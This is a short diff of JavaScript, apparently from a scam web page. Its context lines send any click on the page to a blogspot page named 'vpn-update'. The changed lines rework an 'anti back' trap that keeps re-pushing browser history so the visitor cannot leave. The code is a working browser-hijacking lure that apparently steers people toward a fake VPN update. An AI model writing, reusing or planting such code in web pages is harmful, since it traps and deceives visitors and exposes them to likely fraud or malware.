@@ -30,10 +30,11 @@ location.href = "https://liverscout.blogspot.com/p/vpn-update.html";
 }
 document.querySelector('body').addEventListener('click', go_away);
 // anti back
-history.pushState("back", null, null);
-window.onpopstate = function () { 
-history.pushState('back', null, null); 
-};
+history.pushState(null, null, '#');
+window.addEventListener('popstate', function(event)
+{
+history.pushState(null, null, '#');
+});
 // Laptop
 if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)) || (navigator.userAgent.indexOf('Android') != -1)){
 }
